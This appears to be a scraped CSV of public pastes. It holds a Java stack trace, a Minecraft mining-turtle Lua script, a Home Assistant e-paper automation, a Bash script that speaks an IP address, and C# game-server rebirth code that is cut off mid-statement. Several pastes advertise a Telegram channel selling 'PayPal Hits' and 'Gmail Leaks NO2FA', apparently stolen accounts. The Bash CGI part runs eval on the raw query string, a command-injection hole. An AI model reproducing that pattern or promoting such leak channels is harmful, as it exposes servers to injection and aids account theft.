id,title,username,language,date,content
aSf3ufvR,PayPal Hits 5C,Pimentel_00,JavaScript,Monday 9th of June 2025 01:07:14 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
6bYFJRCSST
"
NyKs4kjU,‚úÖ Account Leaks PR,Pimentel_00,JavaScript,Monday 9th of June 2025 01:07:05 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
Sf7IDeGNgJ
"
27aB8SZa,‚úÖGmail Leaks NO2FA 8D,Pimentel_00,JavaScript,Monday 9th of June 2025 01:06:53 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
xqAssklShP
"
edmLmaBH,Fresh Leaks X4,Pimentel_00,JavaScript,Monday 9th of June 2025 01:06:37 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
pGcGmKEWgc
"
vCsBab5Y,PayPal Hits 5C,Pimentel_00,JavaScript,Monday 9th of June 2025 01:06:27 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
XcPfq8YBbA
"
sdDiGD3k,‚úÖ Account Leaks PR,Pimentel_00,JavaScript,Monday 9th of June 2025 01:06:17 PM CDT," 

ùó£ùóóùóô: https://t.me/LucasLEAK
 
PbdVoNTyQA
"
RcLNPbJ1,2025-06-09T20:05:29.621590,powerampache,PHP,Monday 9th of June 2025 01:05:30 PM CDT,"1.01-77 (77) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
TJmgLyJE,CC turtle,squidingtin,Lua,Monday 9th of June 2025 12:40:24 PM CDT,"-- 3D Miner and Mapper with Fuel Check, Junk Dropping, and Disk Safety

-- Config: target ores to mine
local targetBlocks = {
    [""minecraft:coal_ore""] = true,
    [""minecraft:iron_ore""] = true,
    [""minecraft:copper_ore""] = true
}

-- Config: junk blocks to auto-drop
local junkBlocks = {
    [""minecraft:cobblestone""] = true,
    [""minecraft:dirt""] = true,
    [""minecraft:granite""] = true,
    [""minecraft:diorite""] = true,
    [""minecraft:andesite""] = true,
    [""minecraft:gravel""] = true,
    [""minecraft:sand""] = true,
    [""minecraft:tuff""] = true
}

-- Position and direction tracking
local pos = {x = 0, y = 0, z = 0}
local dir = 0 -- 0=N,1=E,2=S,3=W

local map = {}
local visited = {}

local function key(x,y,z) return x.."",""..y.."",""..z end

local function saveMap(x, y, z, face, id)
    map[x] = map[x] or {}
    map[x][y] = map[x][y] or {}
    map[x][y][z] = map[x][y][z] or {}
    map[x][y][z][face] = id
end

-- Turn helpers
local function turnLeft()
    dir = (dir + 3) % 4
    turtle.turnLeft()
end

local function turnRight()
    dir = (dir + 1) % 4
    turtle.turnRight()
end

local function faceName()
    if dir == 0 then return ""north""
    elseif dir == 1 then return ""east""
    elseif dir == 2 then return ""south""
    else return ""west"" end
end

-- Dump junk blocks from inventory
local function dumpJunk()
    for i = 1, 16 do
        local item = turtle.getItemDetail(i)
        if item and junkBlocks[item.name] then
            turtle.select(i)
            turtle.drop() -- drops forward
        end
    end
    turtle.select(1)
end

-- Dig forward if target block is there
local function tryDigForward()
    local success, data = turtle.inspect()
    if success and targetBlocks[data.name] then
        turtle.dig()
        dumpJunk()
        return true
    end
    return false
end

-- Move forward, update position, mark old block as empty
local function tryForward()
    local px, py, pz = pos.x, pos.y, pos.z

    if tryDigForward() then sleep(0.4) end

    if turtle.forward() then
        -- Update pos
        if dir == 0 then pos.z = pos.z - 1
        elseif dir == 1 then pos.x = pos.x + 1
        elseif dir == 2 then pos.z = pos.z + 1
        elseif dir == 3 then pos.x = pos.x - 1 end

        -- Mark new position as empty (center)
        saveMap(pos.x, pos.y, pos.z, ""center"", ""empty"")

        return true
    end
    return false
end

-- Dig up if target block is there
local function tryUp()
    local success, data = turtle.inspectUp()
    if success and targetBlocks[data.name] then
        turtle.digUp()
        dumpJunk()
    end
    if turtle.up() then
        pos.y = pos.y + 1
        saveMap(pos.x, pos.y, pos.z, ""center"", ""empty"")
        return true
    end
    return false
end

-- Dig down if target block is there
local function tryDown()
    local success, data = turtle.inspectDown()
    if success and targetBlocks[data.name] then
        turtle.digDown()
        dumpJunk()
    end
    if turtle.down() then
        pos.y = pos.y - 1
        saveMap(pos.x, pos.y, pos.z, ""center"", ""empty"")
        return true
    end
    return false
end

-- Inspect all surroundings once per position
local function inspectAll(force)
    local blockKey = key(pos.x, pos.y, pos.z)
    if visited[blockKey] and not force then return end
    visited[blockKey] = true

    local successF, dataF = turtle.inspect()
    if successF then saveMap(pos.x, pos.y, pos.z, ""front"", dataF.name) end

    local successUp, dataUp = turtle.inspectUp()
    if successUp then saveMap(pos.x, pos.y, pos.z, ""up"", dataUp.name) end

    local successDown, dataDown = turtle.inspectDown()
    if successDown then saveMap(pos.x, pos.y, pos.z, ""down"", dataDown.name) end

    for i = 1, 4 do
        turnRight()
        local successS, dataS = turtle.inspect()
        if successS then
            saveMap(pos.x, pos.y, pos.z, faceName(), dataS.name)
        end
    end
end

-- Check fuel level; return true if below 25%
local function checkFuel()
    local level = turtle.getFuelLevel()
    local limit = turtle.getFuelLimit()
    if limit == ""unlimited"" then return false end
    if level / limit < 0.25 then
        print(""Fuel below 25%, returning to base..."")
        return true
    end
    return false
end

-- Turn turtle to face given direction (0-3)
local function faceDirection(targetDir)
    while dir ~= targetDir do
        turnRight()
    end
end

-- Move backward and update position
local function moveBack()
    if turtle.back() then
        if dir == 0 then pos.z = pos.z + 1
        elseif dir == 1 then pos.x = pos.x - 1
        elseif dir == 2 then pos.z = pos.z - 1
        elseif dir == 3 then pos.x = pos.x + 1 end
        return true
    end
    return false
end

-- Return safely to spawn (0,0,0), avoiding (0,0,-1)
local function goHome()
    -- Move vertically to y=0
    while pos.y > 0 do tryDown() end
    while pos.y < 0 do tryUp() end

    -- Move horizontally x=0
    if pos.x > 0 then faceDirection(3) -- west
    elseif pos.x < 0 then faceDirection(1) -- east
    end
    while pos.x ~= 0 do tryForward() end

    -- Move horizontally z=0, avoid (0,0,-1)
    if pos.z > 0 then faceDirection(0) -- north
    elseif pos.z < 0 then faceDirection(2) -- south
    end
    while pos.z ~= 0 do
        if pos.x == 0 and pos.y == 0 and pos.z == -1 then
            print(""Avoiding disk drive at (0,0,-1)"")
            break
        end
        tryForward()
    end
end

-- Recursive exploration of area
local function explore()
    if checkFuel() then
        goHome()
        writeMap()
        error(""Stopped: Fuel below 25%"")
    end

    inspectAll()

    -- Explore vertically
    if tryUp() then explore() tryDown() end
    if tryDown() then explore() tryUp() end

    -- Explore horizontally in 4 directions
    for i = 1, 4 do
        if tryForward() then
            explore()
            moveBack()
        end
        turnRight()
    end
end

-- Save map to disk under turtle
function writeMap()
    if not fs.exists(""disk"") then
        print(""No disk under turtle to save map!"")
        return
    end
    local f = fs.open(""disk/map.json"", ""w"")
    f.write(textutils.serializeJSON(map))
    f.close()
    print(""Map saved to disk/map.json"")
end

-- Start script
print(""Starting 3D mining and mapping..."")
explore()
goHome()
writeMap()
print(""Done."")
"
26SsWWpt,ePaper Tag v2.15,The_Holocron,YAML,Monday 9th of June 2025 12:06:28 PM CDT,"alias: Epaper Busy Tag - Free/Busy with Weather
description: >-
  Updates an epaper tag with busy or available based on calendar events (5 min
  before/after), add weather to available time, skips events marked ""free time""
triggers:
  - entity_id: calendar.CALENDAR_NAME
    event: start
    offset: ""-0:5:0""
    id: PRE_START
    trigger: calendar
  - entity_id: calendar.CALENDAR_NAME
    event: start
    offset: ""0:0:0""
    id: ACTUAL_START
    trigger: calendar
  - entity_id: calendar.CALENDAR_NAME
    event: end
    offset: ""0:5:0""
    id: POST_END
    trigger: calendar
  - hours: ""*""
    minutes: /30
    id: REGULAR_CHECK
    enabled: true
    trigger: time_pattern
conditions: []
actions:
  - choose:
      - conditions:
          - condition: trigger
            id:
              - PRE_START
              - ACTUAL_START
          - condition: template
            value_template: >-
              {% set show_as = trigger.calendar_event.get('show_as', 'busy') %}
              {% set transparency = trigger.calendar_event.get('transparency',
              'opaque') %} {{ show_as != 'free' and transparency !=
              'transparent' }}
        sequence:
          - variables:
              back_color: red
              text_color: white
              status_message: BUSY
              weather_info: """"
      - conditions:
          - condition: trigger
            id:
              - POST_END
        sequence:
          - delay:
              seconds: 5
          - if:
              - condition: template
                value_template: >-
                  {% set now = now() %} {% set next_start =
                  state_attr('calendar.CALENDAR_NAME', 'start_time') %} {% if
                  next_start %}
                    {% set next_event_time = as_timestamp(next_start) %}
                    {% set current_time = as_timestamp(now) %}
                    {{ (next_event_time - current_time) <= 300 }}
                  {% else %}
                    false
                  {% endif %}
            then:
              - variables:
                  back_color: red
                  text_color: white
                  status_message: BUSY
                  weather_info: """"
            else:
              - variables:
                  back_color: white
                  text_color: black
                  status_message: AVAILABLE
                  weather_info: >-
                    {%- set temp = state_attr('weather.forecast_home',
                    'temperature') -%} {%- set condition =
                    states('weather.forecast_home') -%} {%- if temp and
                    condition -%} {{ temp }}¬∞F, {{ condition | title }} {%- else
                    -%} Weather unavailable {%- endif -%}
      - conditions:
          - condition: trigger
            id:
              - REGULAR_CHECK
          - condition: state
            entity_id: calendar.CALENDAR_NAME
            state: ""off""
        sequence:
          - variables:
              back_color: white
              text_color: black
              status_message: AVAILABLE
              weather_info: >-
                {%- set temp = state_attr('weather.forecast_home',
                'temperature') -%} {%- set condition =
                states('weather.forecast_home') -%} {%- if temp and condition
                -%} {{ temp }}¬∞F, {{ condition | title }} {%- else -%} Weather
                unavailable {%- endif -%}
    default:
      - if:
          - condition: and
            conditions:
              - condition: state
                entity_id: calendar.CALENDAR_NAME
                state: ""on""
              - condition: template
                value_template: >-
                  {% set show_as = state_attr('calendar.CALENDAR_NAME', 'show_as')
                  %} {% set transparency = state_attr('calendar.CALENDAR_NAME',
                  'transparency') %} {{ show_as != 'free' and transparency !=
                  'transparent' }}
        then:
          - variables:
              back_color: red
              text_color: white
              status_message: BUSY
              weather_info: """"
        else:
          - variables:
              back_color: white
              text_color: black
              status_message: AVAILABLE
              weather_info: >-
                {%- set temp = state_attr('weather.forecast_home',
                'temperature') -%} {%- set condition =
                states('weather.forecast_home') -%} {%- if temp and condition
                -%} {{ temp }}¬∞F, {{ condition | title }} {%- else -%} Weather
                unavailable {%- endif -%}
  - metadata: {}
    data:
      rotate: 0
      dither: ""0""
      ttl: 60
      dry-run: false
      background: ""{{ back_color }}""
      payload:
        - type: text
          value: ""{{ status_message }}""
          x: 50%
          ""y"": 35%
          font: ppb.ttf
          size: 36
          color: ""{{ text_color }}""
          anchor: mm
        - type: text
          value: ""{{ weather_info }}""
          x: 50%
          ""y"": 65%
          font: ppb.ttf
          size: 20
          color: ""{{ text_color }}""
          anchor: mm
    target:
      device_id: ##FILL IN YOUR OWN##
    action: open_epaper_link.drawcustom
mode: restart"
QEe2V3ER,Speak IP Address with My Voice,metalx1000,Bash,Monday 9th of June 2025 11:35:37 AM CDT,"#record digits vocals
for i in {0..9}
do 
  echo $i
  rec ${i}.wav silence 1 0.1 3% 1 0.5 3%
  sleep .2
done

#record dot vocals
rec dot.wav silence 1 0.1 3% 1 0.5 3%

# play ip address audio
ip=""$(hostname -I|awk '{print $1}')""
for ((i=0; i<${#ip}; i++)); do
  char=""${ip:i:1}""
  [[ ""$char"" == ""."" ]] && char=""dot""
  mpv ${char}.wav
done

# wav output for streaming to Thingino
echo ""Content-type: audio/x-wav""
echo """"
# get q variable
eval $(echo ""$QUERY_STRING"" | awk -F'&' '{for(i=1;i<=NF;i++){print $i}}')

#get IP address and strip all non number and 'dot' chars
ip=$(busybox httpd -d $q | sed 's/[^0-9.]//g')

input_wavs=""""
for ((i = 0; i < ${#ip}; i++)); do
  char=""${ip:i:1}""
  [[ ""$char"" == ""."" ]] && char=""dot""
  input_wavs+=""${char}.wav ""
done
sox $input_wavs -t wav - channels 1 rate 16000"
69sZUGCy,ReborInformation,Jh0n-K3v1n,C#,Monday 9th of June 2025 10:55:13 AM CDT,"        public unsafe void Reborn(Role.Player player, byte RebornClass , ServerSockets.Packet stream)
        {


                if (RebornClass % 10 == 1 || RebornClass == 132 || RebornClass == 142)
                {
                    switch (player.Reborn)
                    {
                        case 0:
                            {


                                foreach (var info in this)
                                {
                                    if (info.Item1 == 1 && info.Item2 == player.Class && info.Item3 == RebornClass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AddRebornSpells:
                                            case Action.Add:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                        player.Owner.MySpells.Add(stream,spellid);
                                                    break;
                                                }
                                            case Action.Delete:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.Remove(spellid,stream);
                                                    }
                                                    break;
                                                }
                                            case Action.Downgrade:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                        player.Owner.MySpells.RebornSpell(stream,spellid);
                                                    break;
                                                }

                                        }
                                    }
                                }
                                player.FirstRebornLevel = (byte)player.Level;
                                player.FirstClass = player.Class;
                                player.Class = RebornClass;
                                player.Reborn = 1;
                                player.SendUpdate(stream,player.Reborn, Game.MsgServer.MsgUpdate.DataType.Reborn);
#if Arabic
                                    Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got "" + player.Reborn + "" reborns."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.Center).GetArray(stream));
                             
#else
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got "" + player.Reborn + "" reborns."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.Center).GetArray(stream));
                             
#endif
                               
                                break;
                            }
                        case 1:
                            {

                                foreach (var info in this)
                                {
                                    if (info.Item1 == 2 && info.Item2 == player.Class && info.Item3 == RebornClass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AddRebornSpells:
                                            case Action.Add:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                        player.Owner.MySpells.Add(stream,spellid);
                                                    break;
                                                }
                                            case Action.Delete:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.Remove(spellid, stream);
                                                    }
                                                    break;
                                                }
                                            case Action.Downgrade:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.RebornSpell(stream,spellid);
                                                    }
                                                    break;
                                                }

                                        }
                                    }
                                }
                                player.SecoundeRebornLevel = (byte)player.Level;
                                player.SecoundeClass = player.Class;
                                player.Class = RebornClass;
                                player.Reborn = 2;
                                player.SendUpdate(stream,player.Reborn, Game.MsgServer.MsgUpdate.DataType.Reborn);
#if Arabic
                                 Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got "" + player.Reborn + "" nd reborn."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.Center).GetArray(stream));
                                
#else
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got "" + player.Reborn + "" nd reborn."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.Center).GetArray(stream));
                                
#endif
                               
                                break;
                            }
                        case 2:
                            {
                                player.Owner.MySpells.ClearSpells(StaticSpells, stream);

                                byte RClass = 0;
                                if (player.SecoundeClass == 135)
                                    RClass = 132;
                                else if (player.SecoundeClass == 145)
                                    RClass = 142;
                                else
                                    RClass = (byte)(player.SecoundeClass - 4);

                                byte Twoclass = 0;
                                if (player.Class == 135)
                                    Twoclass = 132;
                                else if (player.Class == 145)
                                    Twoclass = 142;
                                else
                                    Twoclass = (byte)(player.Class - 4);

                                foreach (var info in this)
                                {
                                    if (info.Item1 == 0 && info.Item2 == 0 && info.Item3 == RClass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AllClassSpells:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        if (!StaticSpells.Contains(spellid))
                                                            player.Owner.MySpells.Add(stream,spellid);
                                                    }
                                                    break;
                                                }
                                        }
                                    }
                                }
                                foreach (var info in this)
                                {
                                    if (info.Item1 == 1 && info.Item2 == player.SecoundeClass && info.Item3 == Twoclass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AddRebornSpells:
                                            case Action.Add:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                        player.Owner.MySpells.Add(stream,spellid);
                                                    break;
                                                }
                                            case Action.Delete:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.Remove(spellid, stream);
                                                    }
                                                    break;
                                                }
                                            case Action.Downgrade:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.RebornSpell(stream,spellid);
                                                    }
                                                    break;
                                                }

                                        }
                                    }
                                }
                                foreach (var info in this)
                                {
                                    if (info.Item1 == 0 && info.Item2 == 0 && info.Item3 == Twoclass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AllClassSpells:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        if (!StaticSpells.Contains(spellid))
                                                            player.Owner.MySpells.Add(stream,spellid);
                                                    }
                                                    break;
                                                }
                                        }
                                    }
                                }
                                foreach (var info in this)
                                {
                                    if (info.Item1 == 2 && info.Item2 == player.Class && info.Item3 == RebornClass)
                                    {
                                        switch (info.Item4)
                                        {
                                            case Action.AddRebornSpells:
                                            case Action.Add:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                        player.Owner.MySpells.Add(stream,spellid);
                                                    break;
                                                }
                                            case Action.Delete:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.Remove(spellid, stream);
                                                    }
                                                    break;
                                                }
                                            case Action.Downgrade:
                                                {
                                                    foreach (var spellid in info.Item5)
                                                    {
                                                        player.Owner.MySpells.RebornSpell(stream,spellid);
                                                    }
                                                    break;
                                                }
                                        }
                                    }
                                }
                                player.FirstRebornLevel = player.SecoundeRebornLevel;
                                player.SecoundeRebornLevel = (byte)player.Level;
                                player.FirstClass = player.SecoundeClass;
                                player.SecoundeClass = player.Class;
                                player.Class = RebornClass;
#if Arabic
                                 Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got reincanation."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.Center).GetArray(stream));
                                
#else
                                Program.SendGlobalPackets.Enqueue(new Game.MsgServer.MsgMessage(""Congratulations! "" + player.Name + "" has got reincanation."", Game.MsgServer.MsgMessage.MsgColor.white, Game.MsgServer.MsgMessage.ChatMode.System).GetArray(stream));
                                
#endif
                               
                                player.Reincarnation = true;
                                break;
                            }
                    }

                    try
                    {
                        foreach (var item in player.Owner.Equipment.ClientItems.Values)
                        {
                            if (item != null)
                            {
                                try
                                {
                                    if (item.Position != (ushort)Role.Flags.ConquerItem.AleternanteBottle
                                        && item.Position != (ushort)Role.Flags.ConquerItem.AleternanteGarment
                                        && item.Position != (ushort)Role.Flags.ConquerItem.Bottle
                                        && item.Position != (ushort)Role.Flags.ConquerItem.Fan
                                        && item.Position != (ushort)Role.Flags.ConquerItem.Garment
                                        && item.Position != (ushort)Role.Flags.ConquerItem.LeftWeaponAccessory
                                        && item.Position != (ushort)Role.Flags.ConquerItem.RidingCrop
                                        && item.Position != (ushort)Role.Flags.ConquerItem.RightWeaponAccessory
                                        && item.Position != (ushort)Role.Flags.ConquerItem.Steed
                                        && item.Position != (ushort)Role.Flags.ConquerItem.SteedMount
                                        && item.Position != (ushort)Role.Flags.ConquerItem.Tower)
                                    {
                                        item.ITEM_ID = Database.Server.ItemsBase.DowngradeItem(item.ITEM_ID);
                                        item.Mode = Role.Flags.ItemMode.Update;
                                        item.Send(player.Owner, stream);
                                    }
                                }
                                catch (Exception e) { MyConsole.WriteLine(e.ToString()); }
                            }
                        }
                    }
                    catch (Exception e) { MyConsole.WriteLine(e.ToString()); }
                    player.Owner.Equipment.Remove(Role.Flags.ConquerItem.LeftWeapon, stream);
                    player.Owner.Equipment.Remove(Role.Flags.ConquerItem.AleternanteLeftWeapon, stream);


                    player.Level = 15;
                    player.Experience = Database.Server.LevelInfo[Database.DBLevExp.Sort.User][(byte)(player.Level - 1)].Experience;
                    player.SendUpdate(stream,(long)player.Experience, Game.MsgServer.MsgUpdate.DataType.Experience);


                    ActionQuery action = new ActionQuery()
                    {
                        ObjId = player.UID,
                        Type = ActionType.Leveled,
                       dwParam = player.Level
                    };
                    player.Owner.Send(stream.ActionCreate(&action));

                
                    player.SendUpdate(stream,player.Level, Game.MsgServer.MsgUpdate.DataType.Level);
                    // Database.DataCore.AtributeStatus.GetStatus(player, true);

                    player.Strength = player.Agility = player.Spirit = 0;
                    player.Vitality = 1;
                    if (player.Reborn == 1)
                    {
                        player.Atributes = (ushort)(Database.Server.RebornInfo.ExtraAtributePoints(player.FirstRebornLevel, player.FirstClass)
                            + 52 + 3 * (player.Level - 15) + player.ExtraAtributes);
                    }
                    else
                    {
                        player.Atributes = (ushort)(Database.Server.RebornInfo.ExtraAtributePoints(player.FirstRebornLevel, player.FirstClass) +
                            Database.Server.RebornInfo.ExtraAtributePoints(player.SecoundeRebornLevel, player.SecoundeClass) + 52 + 3 * (player.Level - 15) + player.ExtraAtributes);
                    }
                    player.SendUpdate(stream,player.Strength, Game.MsgServer.MsgUpdate.DataType.Strength);
                    player.SendUpdate(stream,player.Agility, Game.MsgServer.MsgUpdate.DataType.Agility);
                    player.SendUpdate(stream,player.Spirit, Game.MsgServer.MsgUpdate.DataType.Spirit);
                    player.SendUpdate(stream,player.Vitality, Game.MsgServer.MsgUpdate.DataType.Vitality);
                    player.SendUpdate(stream,player.Atributes, Game.MsgServer.MsgUpdate.DataType.Atributes);
                    player.SendUpdate(stream,player.FirstClass, Game.MsgServer.MsgUpdate.DataType.FirsRebornClass);
                    player.SendUpdate(stream,player.SecoundeClass, Game.MsgServer.MsgUpdate.DataType.SecondRebornClass);
                    player.Owner.Equipment.QueryEquipment(player.Owner.Equipment.Alternante, true);
                    Database.PrestigeRanking.CheckReborn(player.Owner);

                    var client = player.Owner;

                    client.Player.RemoveFlag(MsgUpdate.Flags.ChillingSnow);
                    client.Player.RemoveFlag(MsgUpdate.Flags.HealingSnow);


                    if (Database.AtributesStatus.IsTrojan(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.FastBlader))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.FastBlader);

                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ScrenSword))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.ScrenSword);

                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Cyclone))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Cyclone);
                    }
                    else if (Database.AtributesStatus.IsWindWalker(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.AngerofStomper))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.AngerofStomper);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.JusticeChant))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.JusticeChant);

                     
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Circle))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Circle);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Rectangle))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Rectangle);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Sector))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Sector);
                    }
                    else if (Database.AtributesStatus.IsWarrior(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Superman))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Superman);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.FastBlader))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.FastBlader);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ScrenSword))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.ScrenSword);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Shield))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Shield);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Accuracy))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Accuracy);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Roar))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Roar);
                    }
                    else if (Database.AtributesStatus.IsArcher(client.Player.Class))
                    {
                        client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.XpFly);
                    }
                    else if (Database.AtributesStatus.IsNinja(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.FatalStrike))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.FatalStrike);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ToxicFog))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.ToxicFog);
                    }
                    else if (Database.AtributesStatus.IsMonk(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.WhirlwindKick))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.WhirlwindKick);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.TripleAttack))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.TripleAttack);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Oblivion))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Oblivion);
                    }
                    else if (Database.AtributesStatus.IsPirate(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.CannonBarrage))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.CannonBarrage);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.BladeTempest))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.BladeTempest);
                    }
                    else if (Database.AtributesStatus.IsLee(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.DragonPunch))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.DragonPunch);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.DragonCyclone))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.DragonCyclone);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.DragonFlow))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.DragonFlow);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.AirRaid))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.AirRaid);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.AirSweep))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.AirSweep);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.AirKick))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.AirKick);

                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.AirStrike))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.AirStrike);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.EarthSweep))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.EarthSweep);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Kick))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Kick);
                    }
                    else if (Database.AtributesStatus.IsTaoist(client.Player.Class))
                    {
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.ChainBolt))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.ChainBolt);
                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Lightning))
